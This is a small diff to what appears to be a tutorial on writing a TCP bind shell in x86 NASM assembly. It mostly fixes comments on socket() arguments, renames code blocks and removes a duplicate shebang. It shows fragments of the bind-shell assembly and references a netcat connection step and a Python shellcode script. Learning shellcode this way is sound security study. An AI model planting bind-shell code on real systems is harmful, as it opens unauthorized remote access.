@@ -302,8 +302,8 @@ int lsock = socket(2, SOCK_STREAM, 0);
 #define INADDR_ANY ((unsigned long int) 0x00000000)
 #+END_SRC
 
-#+Name: bindshellasm.asm
-#+BEGIN_SRC asm
+#+Name: bindshellasm.nasm
+#+BEGIN_SRC nasm
 global _start
 ;; Note: We will store 2 file descriptors along the way
 ;; We will put the listening socket file descriptor in edi
@@ -323,9 +323,9 @@ section .text
 
     ;; Put the socket() args on the stack
     xor ecx, ecx
-    push ecx ; INADDR_ANY Accept on any interface 0x00000000
+    push ecx ; Specify protocol as 0
     push ebx ; SOCK_STREAM is the type of socket 1
-    push 0x2 ; Protocol AF_INET is the IP Protocol 2
+    push 0x2 ; Domain af_inet sets protocol family to ip protocol 2
 
     mov ecx, esp ; Save pointer to args for the socket() call
     int 0x80 ; call sys_socket
@@ -438,7 +438,7 @@ And run the shellcode using:
 
 And connect using netcat:
 
-#+Name: compile assembly script
+#+Name: netcat bind connection
 #+BEGIN_SRC sh
 
 #!/bin/bash
@@ -516,8 +516,6 @@ shellcode and print out the result:
 
 #+Name: tcp-bind-shell.py
 #+BEGIN_SRC python
-#!/usr/bin/python
-
 #!/usr/bin/python
 
 import sys
